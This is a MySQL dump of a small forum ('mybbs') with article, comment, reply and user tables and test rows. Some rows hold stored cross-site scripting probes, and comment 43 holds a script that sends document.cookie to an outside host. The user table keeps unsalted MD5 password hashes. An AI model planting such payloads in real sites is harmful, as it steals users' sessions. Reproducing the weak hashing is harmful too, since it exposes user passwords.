

SET FOREIGN_KEY_CHECKS=0;
CREATE DATABASE mybbs DEFAULT CHARACTER SET utf8;
USE mybbs;
-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) DEFAULT NULL,
  `content` text,
  `date` datetime DEFAULT NULL,
  `uid` int(11) NOT NULL,
  `lable` varchar(100) DEFAULT NULL,
  `status` int(10) unsigned zerofill DEFAULT NULL,
  PRIMARY KEY (`aid`),
  KEY `uid` (`uid`),
  CONSTRAINT `uid` FOREIGN KEY (`uid`) REFERENCES `user` (`uid`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=113 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES ('103', 'gggg', '<p><img src=\"http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/14/tza_thumb.gif\"><img src=\"http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/5c/huanglianwx_thumb.gif\"></p><p><br></p>', '2018-02-05 13:31:59', '22', 'fff', null);
INSERT INTO `article` VALUES ('106', '获得', '<p>能得到什么都<br></p><p><img style=\"max-width: 100%;\" alt=\"bizhi\" src=\"/SSM_BBS/resources/imgs/6836283599384734.jpg&#10;\"></p><p><br></p>', '2018-02-05 14:06:43', '21', '所以', null);
INSERT INTO `article` VALUES ('109', '测试测试', '<p>测试测试<img src=\"http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/a6/x_thumb.gif\"></p><p><img style=\"width: 558.9px; height: 418.5px; max-width: 100%;\" alt=\"background\" src=\"/SSM_BBS/resources/imgs/15008905927443494.jpg&#10;\"></p><p><br></p>', '2018-02-05 15:18:08', '21', '测试', null);
INSERT INTO `article` VALUES ('110', '<img src=\"javascript:alter(\'xss\')\">', '<p>asd</p>', '2018-02-20 18:50:02', '25', '', null);
INSERT INTO `article` VALUES ('111', '<script type=\"text/javascript\">alter(\'aaa\')</script>', '<p>asd</p>', '2018-02-20 18:52:56', '25', '', null);
INSERT INTO `article` VALUES ('112', '<script type=\"text/javascript\">alert(\'aaa\')</script>', '<p>sss</p>', '2018-02-20 18:54:15', '25', '', null);

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment` (
  `cid` int(11) NOT NULL AUTO_INCREMENT,
  `content` text,
  `aid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `date` datetime DEFAULT NULL,
  PRIMARY KEY (`cid`),
  KEY `aid` (`aid`),
  KEY `uid` (`uid`),
  CONSTRAINT `aid` FOREIGN KEY (`aid`) REFERENCES `article` (`aid`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `comment_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`uid`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of comment
-- ----------------------------
INSERT INTO `comment` VALUES ('37', '<p>dewqew<img src=\"http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/6a/laugh.gif\"></p><p><br></p>', '103', '22', '2018-02-05 13:32:08');
INSERT INTO `comment` VALUES ('40', '<p>98777<br></p><p><br></p>', '103', '21', '2018-02-05 13:49:06');
INSERT INTO `comment` VALUES ('41', '<p>厉害厉害<br></p><p><img style=\"max-width: 100%;\" alt=\"java\" src=\"/SSM_BBS/resources/imgs/9336563831700957.jpg&#10;\"></p><p><br></p>', '106', '21', '2018-02-05 14:07:05');
INSERT INTO `comment` VALUES ('43', '<p>var&nbsp;img&nbsp;=&nbsp;document.createElement(\'img\');\n</p><p>img.src=\'http://www.xss.com?cookie=\'+document.cookie;\n</p><p>img.style.display=\'none\';\n</p><p>document.getElementsByTagName(\'body\')[0].appendChild(img);</p><p><br></p>', '109', '24', '2018-02-20 14:30:33');

-- ----------------------------
-- Table structure for floor
-- ----------------------------
DROP TABLE IF EXISTS `floor`;
CREATE TABLE `floor` (
  `fid` int(11) NOT NULL AUTO_INCREMENT,
  `aid` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `content` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`fid`),
  KEY `cid` (`cid`),
  CONSTRAINT `cid` FOREIGN KEY (`cid`) REFERENCES `comment` (`cid`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of floor
-- ----------------------------
INSERT INTO `floor` VALUES ('29', '103', '37', '21', '889');
INSERT INTO `floor` VALUES ('30', '106', '41', '21', '看看');
INSERT INTO `floor` VALUES ('31', '106', '41', '21', '回复 6666 : iiii');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `uid` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `headimg` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`uid`),
  KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of userq
-- ----------------------------
INSERT INTO `user` VALUES ('21', '6666', '', '/resources/imgs/bizhi.jpg');
INSERT INTO `user` VALUES ('22', '123', '37693cfc748049e45d87b8c7d8b9aacd', '/resources/imgs/1503319695135Qqq.jpg');
INSERT INTO `user` VALUES ('23', '123456', '202cb962ac59075b964b07152d234b70', '/resources/imgs/head.png');
INSERT INTO `user` VALUES ('24', 'xiaofei', '202cb962ac59075b964b07152d234b70', '/resources/imgs/head.png');
INSERT INTO `user` VALUES ('25', '', '', '/resources/imgs/head.png');
